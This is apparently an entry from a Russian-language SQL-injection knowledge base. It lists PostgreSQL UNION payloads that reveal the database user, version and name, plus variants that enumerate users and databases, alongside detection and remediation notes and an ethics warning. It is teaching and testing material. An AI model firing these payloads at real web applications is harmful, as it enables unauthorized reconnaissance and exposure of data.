---
id: sqli-postgresql-stack-version
title: "PostgreSQL: раскрытие версии и текущего пользователя"
type: sqli
target: postgresql
category: web
difficulty: beginner
bypass: none
tags: [sqli, postgresql, recon, info-disclosure]
tested_on: ["PostgreSQL 13+"]
success_rate: 0.85
risk: low
cwe: "CWE-200"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
  - target: "info-disclosure"
    type: leads_to
---

# PostgreSQL: раскрытие версии и текущего пользователя

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
' UNION SELECT current_user, version(), current_database() --
```

## Explanation

Первичная разведка после подтверждения инъекции: кто мы в БД (`current_user`),
какая версия (`version()`), какая база (`current_database()`).
От версии зависит доступность `COPY ... PROGRAM` (RCE при суперпользователе),
от пользователя — объём прав.

## Detection

В логах — запросы к `pg_catalog`, `information_schema`, `current_user`.
В HTTP-ответах — строки `PostgreSQL 1x.y on x86_64...`.

## Remediation

- Параметризация.
- Приложение работает под ролью без `SUPERUSER`/`CREATEROLE`.
- Скрытие версий (баннеры, заголовки `Server`).

## Variants

```
' UNION SELECT usename, 2, 3 FROM pg_user --
```

```
' UNION SELECT datname, 2, 3 FROM pg_database --
```
